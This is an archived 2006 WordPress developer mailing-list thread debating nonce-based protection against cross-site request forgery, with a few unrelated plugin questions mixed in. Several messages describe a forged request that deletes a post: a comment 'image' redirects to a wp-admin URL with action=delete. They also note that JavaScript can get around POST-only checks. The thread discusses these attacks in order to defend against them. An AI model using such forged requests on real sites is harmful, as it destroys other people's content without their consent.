Date: Tue Apr 18 10:34:45 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <4444AB62.8070807@paul-mitchell.me.uk>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>	<4443EB35.3020908@paul-mitchell.me.uk>
	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>
	<4444AB62.8070807@paul-mitchell.me.uk>
Message-ID: <E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net>

On Apr 18, 2006, at 5:03 AM, Paul Mitchell wrote:

> Anyway, this "flaw in the current system" is nuclear. It allows a
> trivial remotely-exploitable escalation of privilege with ultimate
> destructive power.

On Apr 18, 2006, at 5:11 AM, David House wrote:
> No need to be able to create drafts.

Okay, so more than just an annoyance for people who aren't sending  
HTTP referrers.  Using a key solves this, by locking things down to  
the blog/user/action/object level.  I don't see the point of using a  
nonce... if you can intercept the key, you have already compromised  
the blog.  In addition, the use of nonces would create a DB write on  
every access of a wp-admin <form>... not  exactly ideal.

The way I see it, using keys is more secure and it works for every  
browser/internet-"security"-suite.  It is essentially what WP uses to  
protect AJAX requests (it sends along bits of the login cookie, which  
is the same concept of "pass along information that is only provided  
to a logged-in user.")

I'm still curious what Matt meant by this... it's the only thing  
stopping me from writing the patch:

On Apr 17, 2006, at 2:37 AM, Matt Mullenweg wrote:
> Unfortunately this doesn't work, because it's trivial to fetch the  
> page and grab the key/nonce before submitting the malicious request.

I sure hope that's not true!
--
Mark Jaquith
http://txfx.net/


From ringmaster at midnightcircus.com  Tue Apr 18 11:18:09 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Tue Apr 18 11:22:15 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>
	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>
	<4443EB35.3020908@paul-mitchell.me.uk>
	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>
	<4444AB62.8070807@paul-mitchell.me.uk>
	<E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net>
Message-ID: <4444CAF1.3090302@midnightcircus.com>

Mark Jaquith wrote:
> Okay, so more than just an annoyance for people who aren't sending HTTP 
> referrers.  Using a key solves this, by locking things down to the 
> blog/user/action/object level.  I don't see the point of using a 
> nonce... if you can intercept the key, you have already compromised the 
> blog.  In addition, the use of nonces would create a DB write on every 
> access of a wp-admin <form>... not  exactly ideal.

When I use the term "nonce" before, it's not necessarily the true 
meaning.  I meant what you're saying here: One key per user per action.

The main idea is that you *don't* want to store the generated key 
anywhere, because that requires an expensive write operation.

It might also be possible to cause these keys to time out, so even if 
they were obtained once, there would be a limited opportunity to use them.

Owen

From mark.wordpress at txfx.net  Tue Apr 18 11:49:18 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Tue Apr 18 11:53:16 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <4444CAF1.3090302@midnightcircus.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>
	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>
	<4443EB35.3020908@paul-mitchell.me.uk>
	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>
	<4444AB62.8070807@paul-mitchell.me.uk>
	<E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net>
	<4444CAF1.3090302@midnightcircus.com>
Message-ID: <679AA336-B13E-4E9A-B85C-581A48FCBE30@txfx.net>

On Apr 18, 2006, at 7:18 AM, Owen Winkler wrote:

> It might also be possible to cause these keys to time out, so even  
> if they were obtained once, there would be a limited opportunity to  
> use them.

Certainly.  Simply add some unit of time to the hash.  The function  
that checks the hash computes multiple hashes, starting with the  
current value of the time unit, and then decrementing the time unit a  
specified number of times until the timeout is reached.  It could  
even be more permissive for certain screens than others (pass another  
variable to the function that checks).  You can reduce the number of  
hashes that need to be computed (so you don't have to compute the  
hash for every minute, going back an hour) by adding the last unit of  
time as floor($minutes/5) so that the time appears to jump from 12:00  
to 12:05 to 12:10 which means you don't have to check all the  
"inbetween" hashes.
--
Mark Jaquith
http://txfx.net/


From ringmaster at midnightcircus.com  Tue Apr 18 13:06:12 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Tue Apr 18 13:06:48 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <679AA336-B13E-4E9A-B85C-581A48FCBE30@txfx.net>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>	<4443EB35.3020908@paul-mitchell.me.uk>	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>	<4444AB62.8070807@paul-mitchell.me.uk>	<E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net>	<4444CAF1.3090302@midnightcircus.com>
	<679AA336-B13E-4E9A-B85C-581A48FCBE30@txfx.net>
Message-ID: <4444E444.5060908@midnightcircus.com>

Mark Jaquith wrote:
> It could even be more 
> permissive for certain screens than others (pass another variable to the 
> function that checks).  

Eh.  I'm still not crazy about the idea of having the individual admin 
pages validate themselves by calling this checking function.  For one, 
it implies that there is someplace in the admin that people should be 
able to go without a key, and I can't think of anyplace like that.  For 
another, any place accidentally missing the check becomes an instant 
vulnerability.

And finally, by adding it to a generic "in the admin" script, it allows 
the keys to be used when accessing plugin option pages without 
necessarily modifying any existing plugins.  (In the case of 
options.php?page=X, by doing the verification in the options.php page, 
which indirectly handles the inclusion of the plugin.)  It will simply 
require plugin authors who want their option pages to circumvent the 
"Are you sure?" messages to add the nonce generator as part of their 
form submission.  Without the key, an "Are you sure?" form should appear 
that when submitted forwards the request on in the same manner as the 
original form, but with the appropriate key.

That's just an idea.  I'm thinking of all of the plugins that people 
have written with options pages that will have to be modified to support 
this, and am trying to devise a way to ease the pain AND get more 
security everywhere.

Owen


From sam at rephrase.net  Tue Apr 18 13:57:32 2006
From: sam at rephrase.net (Sam Angove)
Date: Tue Apr 18 14:01:33 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <4444E444.5060908@midnightcircus.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>
	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>
	<4443EB35.3020908@paul-mitchell.me.uk>
	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>
	<4444AB62.8070807@paul-mitchell.me.uk>
	<E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net>
	<4444CAF1.3090302@midnightcircus.com>
	<679AA336-B13E-4E9A-B85C-581A48FCBE30@txfx.net>
	<4444E444.5060908@midnightcircus.com>
Message-ID: <aa74b1910604180657y6ca75febqdfbeaa4708a700f2@mail.gmail.com>

On 4/18/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
>
> And finally, by adding it to a generic "in the admin" script, it allows
> the keys to be used when accessing plugin option pages without
> necessarily modifying any existing plugins.  (In the case of
> options.php?page=X, by doing the verification in the options.php page,
> which indirectly handles the inclusion of the plugin.)  It will simply
> require plugin authors who want their option pages to circumvent the
> "Are you sure?" messages to add the nonce generator as part of their
> form submission.  Without the key, an "Are you sure?" form should appear
> that when submitted forwards the request on in the same manner as the
> original form, but with the appropriate key.

IAWTP, but if a "good" key is something like `hash(action . item id .
time . user secret . server secret)`, how is it possible to guess what
a plugin might require as `action` or `item id`? The generic "Are you
sure?" form would need some mechanism for finding out the appropriate
key, too.

Standardize on $_REQUEST['action'], maybe, with a generic action-less
(but still user-specific) key if it's missing?
From Brian at TheCodeCave.com  Tue Apr 18 14:32:52 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Tue Apr 18 14:37:01 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <679AA336-B13E-4E9A-B85C-581A48FCBE30@txfx.net>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF9805B@dsimail.drbsystems.com>

>You can reduce the number of  
>hashes that need to be computed (so you don't have to compute the  
>hash for every minute, going back an hour) by adding the last unit of  
>time as floor($minutes/5) so that the time appears to jump from 12:00  
>to 12:05 to 12:10 which means you don't have to check all the  
>"inbetween" hashes.

Agreed, you would just need to decide what time period the functions would
require.  I was worried when I saw the other comment about mailing out links
with these nonces.  You want them to be as specific as possible and if they
don't expire, you've already given up a lot of your security.

We use nonces in several ways where I work.  With one method we create a
single nonce that is very much like  a "I am a super user" badge.  It is
only good for a certain period of time and if the client's time is off, it
is disfunctional.  Additionly, the functions that produce the nonce have
specific checks that prevent the nonce from being created for a time too far
in the future.  

This approach would be simplified for a web app, for the time used in the
hash will always be the server time because nothing is done client side.
Also, there is no need to "post date" a hash allowing it to be good for
perhaps "tommorrow morning".  Finally, the server time is not easily
adjusted.  With client side checks you must worry about the user manually
adjusting the system time in order to get the same free lunch over and over
again.

The other method we use unlocks a specific specific function for a specific
user for a specific time period.  So, our method could include in the hash:
1. A unique identifier for the database being used.
2. The time the nonce was created.
3. A unique identifier for the function to be accessed.
The fact that we are closed source means #3 is a lot more secure for us than
it would be for WordPress.

Please forgive me as I work through the current nonce proposal for
WordPress.  Much of this has been stated already in the earlier posts, so
please don't jump all over me if I am restating the obvious.  Other parts of
it are just rambling as I am working through ideas...
1. "Are You Sure?" checks on every action performed would provide the most
safety.  The idea of using a NONCE is to provide additional security in a
way that does not annoy the users and make WP a pain to use.
2. The goal of the nonce is to prevent a validly logged in admin from
performing unintented administrative activities.
3. A nonce could be created for system wide access, some sort of unit level
access (message management vs comment management vs link management), or for
each specific function (Delete comment <> Mark as spam).  This will have to
be decided.  
4. If a nonce validation fails, the user could be prompted with a "Are you
sure?" (this could be done from the nonce verification routine) or forbidden
to take the action.  This will have to be decided.
5. In WordPress, a nonce will not be the only security check required.  IOW
a user must be logged in and have the proper security in the first place for
the desired action to proceed.  This makes life a bit easier.
6. Because WordPress is open-source and popular, nonces can't use a
standardized and predictable method or spammers will just generate nonces
themselves.  The method must be variable and that probably means a random
number will have to be used in the hash.  
7. If the generation method is random, that means either the resulting hash
must be stored server side for verification purposes OR the number used to
generate the hash must be stored.  
8. If a nonce is NOT used in emailed hyperlinks, the random number can be
tied to a user's session and can expire with that session.    
9. If nonces are to be used in emailed hyperlinks, the linked administrative
actions could then be taken/activated at any time.  This means there is no
specific trigger event that can be used to generate a new random number to
be used in hash method.  
10.  Wordpress /could/ expire and create nonces at the server time midnight
barrier. This could, be done through a simple SQL statement that assigned a
random number to a field in each user record.
11. If the nonces expire, the user will not know for sure whether a link
sent to them will always produce the same behavior.  Whether a nonce expires
after two hours, 24 hours or at the midnight barrier, some users will be
confused about why they sometimes are prompted with "Are You Sure?" and
sometimes they are not.  If the midnight barrier is used, the user could
know that when the click on a link in an email sent yesterday (server time)
they will be prompted.  It the email was sent today (server time), they will
not get an extra prompt.
12. User sessions that pass the midnight barrier could complicate things.
If they click on a hyperlink that was generated "the day before", then they
will be prompted or denied.  (Unless we allow a free pass one-action-pass to
sessions that started the day before.  This creates a very small security
hole.  We could somehow AJAX them a new page at midnight I guess, but that
seems a bit scary.)

I'll think on this more later, but I thought I would "share" what I've been
tossing around so far...

From korey99 at yahoo.com  Tue Apr 18 18:19:35 2006
From: korey99 at yahoo.com (Korey Atterberry)
Date: Tue Apr 18 18:23:32 2006
Subject: [wp-hackers] Filter hook to selectively show comments for a post
Message-ID: <20060418181935.71972.qmail@web33606.mail.mud.yahoo.com>

Hi all-

  First of all, I'm new to this mailing list and I apologize if I
shouldn't be posting here.  I'm looking forward to contributing to the
Wordpress world a little bit by improving a plugin of mine, but I need
a little push in the right direction.  I didn't hear anything from the
general population on the Wordpress support forum, but if there's a
more appropriate resource I would appreciate the suggestion.

  What I want to know is, is there a filter or action hook somewhere
that I could use to selectively display comments on a given post?  

  In my Lazy-K Gallery plugin (htpp://plugins.atterberry.net), I host
an image gallery in one Wordpress Page.  The gallery plugin looks at
the "file" parameter in the query string to determine what image or
folder to display.  My users want to be able to comment individually on
each image.  What I figured I'd do is when a users posts a comment,
insert the image name into the text of the comment (since every image's
comments will be stored under one Page) prior to saving the comment
into the db.  When I display my page, including all the comments, I
would then look at the text of each comment and determine whether it
applies to the image currently being shown.  I haven't found a hook for
that just yet.  I found hooks to let me edit the content, author, etc.,
but not to remove a comment altogether.

Thanks in advance for any direction.  By the way, thanks for all the
work you have done on Wordpress.

Korey Atterberry

From skeltoac at gmail.com  Tue Apr 18 18:43:09 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Tue Apr 18 18:47:09 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <ebe43d680604180211h646ea933g22a0051718ea51aa@mail.gmail.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>
	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>
	<4443EB35.3020908@paul-mitchell.me.uk>
	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>
	<4444AB62.8070807@paul-mitchell.me.uk>
	<ebe43d680604180211h646ea933g22a0051718ea51aa@mail.gmail.com>
Message-ID: <e6ec604d0604181143r23057f8bvadaba5909536020f@mail.gmail.com>

On 4/18/06, David House <dmhouse@gmail.com> wrote:
> How about this:
>
> 1) Admin writes a post.
> 2) Malicious user leaves a comment with an "image", whose source
> redirecs to http://yoursite.com/wp-admin/post.php?action=delete&post=123
> 3) Admin logs in
> 4) Manage -> Comments
> 5) Post is deleted.
>
> No need to be able to create drafts.

POST method would fix this. Somebody remind me why we are using GET.

Andy
From davebytes at comcast.net  Tue Apr 18 18:48:37 2006
From: davebytes at comcast.net (David Chait)
Date: Tue Apr 18 18:52:03 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net><Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu><ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com><4443EB35.3020908@paul-mitchell.me.uk><ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com><4444AB62.8070807@paul-mitchell.me.uk><ebe43d680604180211h646ea933g22a0051718ea51aa@mail.gmail.com>
	<e6ec604d0604181143r23057f8bvadaba5909536020f@mail.gmail.com>
Message-ID: <007601c66318$b3e08ac0$6e01a8c0@sixfour>

Sheesh, you beat me by like 5 minutes on posting this same question! ;)

-d

----- Original Message ----- 
From: "Andy Skelton" <skeltoac@gmail.com>
To: <wp-hackers@lists.automattic.com>
Sent: Tuesday, April 18, 2006 2:43 PM
Subject: Re: [wp-hackers] Rethinking check_admin_referer()


On 4/18/06, David House <dmhouse@gmail.com> wrote:
> How about this:
>
> 1) Admin writes a post.
> 2) Malicious user leaves a comment with an "image", whose source
> redirecs to http://yoursite.com/wp-admin/post.php?action=delete&post=123
> 3) Admin logs in
> 4) Manage -> Comments
> 5) Post is deleted.
>
> No need to be able to create drafts.

POST method would fix this. Somebody remind me why we are using GET.

Andy
_______________________________________________
wp-hackers mailing list
wp-hackers@lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From wp-hackers at paul-mitchell.me.uk  Tue Apr 18 18:47:17 2006
From: wp-hackers at paul-mitchell.me.uk (Paul Mitchell)
Date: Tue Apr 18 18:52:09 2006
Subject: [wp-hackers] Filter hook to selectively show comments for a post
In-Reply-To: <20060418181935.71972.qmail@web33606.mail.mud.yahoo.com>
References: <20060418181935.71972.qmail@web33606.mail.mud.yahoo.com>
Message-ID: <44453435.1020900@paul-mitchell.me.uk>

Korey,

I'd start in your theme's "comments.php". You have $comments and a
foreach loop to play with. You can directly filter comments by content
there.

-- 
Paul Mitchell, Coding and Crafting Quality Software
http://www.libertini.net/libertus/category/software/


From korey99 at yahoo.com  Tue Apr 18 19:03:10 2006
From: korey99 at yahoo.com (Korey Atterberry)
Date: Tue Apr 18 19:07:07 2006
Subject: [wp-hackers] Filter hook to selectively show comments for a post
In-Reply-To: <44453435.1020900@paul-mitchell.me.uk>
Message-ID: <20060418190310.46878.qmail@web33609.mail.mud.yahoo.com>


Thanks for the reply Paul, but I'm trying to accomplish this completely
inside a plugin so that it will work with any user's theme.  That's why
it's frustrating- all I have to do is tell my users to add a line or
two of code to their comments template to filter that array and we're
done.  I'm looking for a more portable solution though...  I was hoping
there was a hook that I hadn't found that would allow me to modify that
array.  

Korey


--- Paul Mitchell <wp-hackers@paul-mitchell.me.uk> wrote:

> Korey,
> 
> I'd start in your theme's "comments.php". You have $comments and a
> foreach loop to play with. You can directly filter comments by
> content
> there.
 

From wp-hackers at paul-mitchell.me.uk  Tue Apr 18 19:27:37 2006
From: wp-hackers at paul-mitchell.me.uk (Paul Mitchell)
Date: Tue Apr 18 19:32:31 2006
Subject: [wp-hackers] Filter hook to selectively show comments for a post
In-Reply-To: <20060418190310.46878.qmail@web33609.mail.mud.yahoo.com>
References: <20060418190310.46878.qmail@web33609.mail.mud.yahoo.com>
Message-ID: <44453DA9.2030001@paul-mitchell.me.uk>

Korey Atterberry wrote:
> Thanks for the reply Paul, but I'm trying to accomplish this completely
> inside a plugin so that it will work with any user's theme.

The WP comment template code
(wp-includes/comment-functions.php/comments_template) doesn't offer any
way for a plugin to filter the comments. Some participation from the
theme is necessary.

Paul

From peter.westwood at ftwr.co.uk  Tue Apr 18 21:02:20 2006
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Tue Apr 18 21:06:18 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <AB4192DE-6B01-480C-8F49-FF4FE4D8DF56@txfx.net>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<444337B0.3040004@mullenweg.com>	<45BDF613-E564-457F-AFFE-115208D0A4BE@txfx.net>	<44440D1C.2030304@ftwr.co.uk>
	<AB4192DE-6B01-480C-8F49-FF4FE4D8DF56@txfx.net>
Message-ID: <444553DC.4090707@ftwr.co.uk>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Mark Jaquith wrote:
> On Apr 17, 2006, at 5:48 PM, Peter Westwood wrote:
> 
>> You need to generate a nonce "per action" and have that stored within
>> the db - in say user meta information and timed out so that it doesn't
>> last forever otherwise it is next to useless as it allows for any type
>> multi pronged off line attack.
>>
>> For example with you solution one attack can get the key and another can
>> use it!
> 
> Again, my question is: HOW can an attacker get the key if it is only
> showed on admin pages where the login has been validated via cookies? 
> An attacker would have to trick a logged-in user into clicking a link
> that would give the attacker the key by extracting it from the
> document... but that's not a CSF attack, that's a XSS attack, and it is
> its own security vulnerability that has to be fixed by
> validating/filtering input data.  And if you can inject a script, the
> current referer-based checks can be bypassed anyway.
> 

You are right at present we don't know how they could get hold of the key.

But it is possible that in the future someone may fine a way - we are
not all perfect coders after all ;-)

This is why the key/nonce should have a limited usage period and
preferably be one-time only.  So that _if_ in the future someone works
out a way of getting hold of it its use is severely limited.

westi
- --
Peter Westwood
http://blog.ftwr.co.uk
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.2 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFERVPcVPRdzag0AcURAh9KAJ9emKPPLRfAdXE5AQqhHgGOBdkHwgCgpV6T
V0Kzr2i1zjFzhar9XGv9gUA=
=qCim
-----END PGP SIGNATURE-----

From peter.westwood at ftwr.co.uk  Tue Apr 18 21:06:05 2006
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Tue Apr 18 21:10:02 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <e6ec604d0604181143r23057f8bvadaba5909536020f@mail.gmail.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>	<4443EB35.3020908@paul-mitchell.me.uk>	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>	<4444AB62.8070807@paul-mitchell.me.uk>	<ebe43d680604180211h646ea933g22a0051718ea51aa@mail.gmail.com>
	<e6ec604d0604181143r23057f8bvadaba5909536020f@mail.gmail.com>
Message-ID: <444554BD.9010209@ftwr.co.uk>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Andy Skelton wrote:
> On 4/18/06, David House <dmhouse@gmail.com> wrote:
>> How about this:
>>
>> 1) Admin writes a post.
>> 2) Malicious user leaves a comment with an "image", whose source
>> redirecs to http://yoursite.com/wp-admin/post.php?action=delete&post=123
>> 3) Admin logs in
>> 4) Manage -> Comments
>> 5) Post is deleted.
>>
>> No need to be able to create drafts.
> 
> POST method would fix this. Somebody remind me why we are using GET.
> 

Indeed it would.

Maybe this is something that needs working of for a 2.0.3 release?!?

westi
- --
Peter Westwood
http://blog.ftwr.co.uk
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.2 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFERVSgVPRdzag0AcURAknHAKCOGxT/E2RIsxOgD8mpsj+A9/K1swCgs/1l
oMgMhl7G0exqjAGOGKOndTs=
=S0FM
-----END PGP SIGNATURE-----

From mikea at turbonet.com  Tue Apr 18 21:11:40 2006
From: mikea at turbonet.com (Michael D. Adams)
Date: Tue Apr 18 21:23:12 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <ebe43d680604180211h646ea933g22a0051718ea51aa@mail.gmail.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>
	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>
	<4443EB35.3020908@paul-mitchell.me.uk>
	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>
	<4444AB62.8070807@paul-mitchell.me.uk>
	<ebe43d680604180211h646ea933g22a0051718ea51aa@mail.gmail.com>
Message-ID: <Pine.GSO.4.58.0604181358180.16841@clyde>

On Tue, 18 Apr 2006, David House wrote:
> 1) Admin writes a post.
> 2) Malicious user leaves a comment with an "image", whose source
> redirecs to http://yoursite.com/wp-admin/post.php?action=delete&post=123
> 3) Admin logs in
> 4) Manage -> Comments
> 5) Post is deleted.

Have you tried this?  KSES should filter out IMGs from users that don't
have the unfiltered_html capability.

Regardless, the draft issue mentioned previously [1] is still there.  As
mentioned by others, we should POST.

[1] http://comox.textdrive.com/pipermail/wp-hackers/2006-April/005704.html
From dmhouse at gmail.com  Tue Apr 18 21:30:44 2006
From: dmhouse at gmail.com (David House)
Date: Tue Apr 18 21:34:44 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <Pine.GSO.4.58.0604181358180.16841@clyde>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>
	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>
	<4443EB35.3020908@paul-mitchell.me.uk>
	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>
	<4444AB62.8070807@paul-mitchell.me.uk>
	<ebe43d680604180211h646ea933g22a0051718ea51aa@mail.gmail.com>
	<Pine.GSO.4.58.0604181358180.16841@clyde>
Message-ID: <ebe43d680604181430t5b432f95m55f82ed70d7831bf@mail.gmail.com>

On 18/04/06, Michael D. Adams <mikea@turbonet.com> wrote:
> Have you tried this?  KSES should filter out IMGs from users that don't
> have the unfiltered_html capability.

Good point, I figured img was among the allowed tags, but apparently not.

> Regardless, the draft issue mentioned previously [1] is still there.  As
> mentioned by others, we should POST.

Yes, and also non-registered users could provide a link like "Great
post, here's [my response]", which links to a redirecting site. An
unwitting admin would click it and it's the same flaw.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From Brian at TheCodeCave.com  Tue Apr 18 22:03:30 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Tue Apr 18 22:07:32 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <444554BD.9010209@ftwr.co.uk>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF98065@dsimail.drbsystems.com>

Andy Skelton wrote:
>> On 4/18/06, David House <dmhouse@gmail.com> wrote:
>> POST method would fix this. Somebody remind me why we are using GET.
> Indeed it would.

That seems like a fairly major methodology change that could break a lot of
stuff, even though you'd be limiting it to the units that currently have an
embedded referrer check.  Additionally, it would not completely solve the
issue.  

I'll quote that article I linked to earlier: (I don't have the original link
at the moment, but the text is here: http://www.thecodecave.com/csrf.txt)

[quote]
> How can it be fixed? Well, there are a couple of ways to stop it, but the
> easiest (in PHP at least) seems to be to have most of the variables used
by
> scripts be used through $HTTP_POST_VARS. So instead of checking for
$action
> in a script, $HTTP_POST_VARS['action'] would be checked. This forces the
> user to use a POST request, not a GET. 

which means the attacker reverts to using Javascript, or entices the victim
to click on an image that's acting as a submit control in a <form>. 
Requiring POST raises the bar, but doesn't really fix the problem.
[/quote]

So, it seems to be a fairly simple thing to update the post vars by using
JavaScript inside the link.  It makes sense that it would be, but I haven't
tried any of this from this context.  I'll have to build a few test pages
when I get a chance...

From false.hopes at gmail.com  Tue Apr 18 23:30:16 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Tue Apr 18 23:34:14 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF98065@dsimail.drbsystems.com>
References: <444554BD.9010209@ftwr.co.uk>
	<D0252C90757CBC4B8BC938A72BEDDF9DF98065@dsimail.drbsystems.com>
Message-ID: <a491f91d0604181630n7b43b531yd436fc6c2e1d1e40@mail.gmail.com>

On 4/18/06, Brian Layman <Brian@thecodecave.com> wrote:
> which means the attacker reverts to using Javascript, or entices the victim
> to click on an image that's acting as a submit control in a <form>.
> Requiring POST raises the bar, but doesn't really fix the problem.
>
> So, it seems to be a fairly simple thing to update the post vars by using
> JavaScript inside the link.  It makes sense that it would be, but I haven't
> tried any of this from this context.  I'll have to build a few test pages
> when I get a chance...

With KSES, this should be a non-issue.


--
--Robert Deaton
http://somethingunpredictable.com
From grijalva at gmail.com  Tue Apr 18 23:42:02 2006
From: grijalva at gmail.com (Dave Grijalva)
Date: Tue Apr 18 23:45:58 2006
Subject: [wp-hackers] Hacking the Archive List
Message-ID: <a0159cd30604181642k48b723feg1293156369bb75af@mail.gmail.com>

The longer I've been blogging, the more space is wasted in my archive list.
What I'd really like to have is a link to every year before the previous and
a link to every month in the current year.  Does anybody know if this is
possible without hacking the wp source? Here's an example of what I'm
looking for


   - April 2006
   - March 2006
   - February 2006
   - January 2006
   - 2005
   - 2004

Thanks in advance for any help.
-dave
From kaf at szub.net  Tue Apr 18 23:55:24 2006
From: kaf at szub.net (Kaf Oseo)
Date: Tue Apr 18 23:59:34 2006
Subject: [wp-hackers] Hacking the Archive List
In-Reply-To: <a0159cd30604181642k48b723feg1293156369bb75af@mail.gmail.com>
References: <a0159cd30604181642k48b723feg1293156369bb75af@mail.gmail.com>
Message-ID: <44457C6C.1030208@szub.net>

http://wordpress.org/support/topic/39204#post-310420

Note that list is not for support. Support questions are best asked
on the support forums, or on IRC.

http://wordpress.org/support/
http://codex.wordpress.org/IRC

-Kaf
From mikea at turbonet.com  Wed Apr 19 01:05:22 2006
From: mikea at turbonet.com (Michael D. Adams)
Date: Wed Apr 19 01:09:42 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <a491f91d0604181630n7b43b531yd436fc6c2e1d1e40@mail.gmail.com>
References: <444554BD.9010209@ftwr.co.uk>
	<D0252C90757CBC4B8BC938A72BEDDF9DF98065@dsimail.drbsystems.com>
	<a491f91d0604181630n7b43b531yd436fc6c2e1d1e40@mail.gmail.com>
Message-ID: <Pine.GSO.4.58.0604181759270.23255@clyde>

> On 4/18/06, Brian Layman <Brian@thecodecave.com> wrote:
> which means the attacker reverts to using Javascript, or entices the victim
> to click on an image that's acting as a submit control in a <form>.
> Requiring POST raises the bar, but doesn't really fix the problem.

Perhaps we already are, but let's get this thread back on track.  Mark
wasn't discussing the security problems with the current scheme (which are
not insurmountable [1]), but the convenience problems.

[1] http://codex.wordpress.org/User:MDAWaffe/referers

Michael
--mdawaffe

PS: Not directed at anyone in particular.  Rather, equally applicable to
myself as any other.
From grijalva at gmail.com  Wed Apr 19 01:36:51 2006
From: grijalva at gmail.com (Dave Grijalva)
Date: Wed Apr 19 01:40:51 2006
Subject: [wp-hackers] Hacking the Archive List
In-Reply-To: <44457C6C.1030208@szub.net>
References: <a0159cd30604181642k48b723feg1293156369bb75af@mail.gmail.com>
	<44457C6C.1030208@szub.net>
Message-ID: <a0159cd30604181836i11c3003em20fd7858f34e0102@mail.gmail.com>

I'm not looking for support.  I just wanna see if I've missed something
before I waste my time writing a plugin or hacking wp.

-dave

On 4/18/06, Kaf Oseo <kaf@szub.net> wrote:
>
